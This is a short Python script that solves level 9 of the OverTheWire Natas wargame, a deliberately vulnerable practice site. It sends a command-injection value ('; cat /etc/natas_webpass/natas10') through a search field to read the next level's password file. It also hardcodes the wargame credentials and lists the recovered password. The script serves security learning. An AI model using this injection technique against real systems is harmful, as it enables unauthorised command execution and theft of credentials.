#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

post_data = {"needle": "; cat /etc/natas_webpass/natas10", "submit": "submit"}

# for the main page
response = session.post(url, data=post_data, auth=(username, password))

# for the /index-source.html page
# response = session.get(url, auth=(username, password))

content = response.text
soup = BeautifulSoup(content, "html.parser")

print(soup.prettify())
# print content

# by going to the /index-source.html page, we find
# this is using passthru() function which could allow us
# to get access to system fiels
# so, we can cat what inside /etc/natas_webpass/natas10
# and we got the password correctly nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

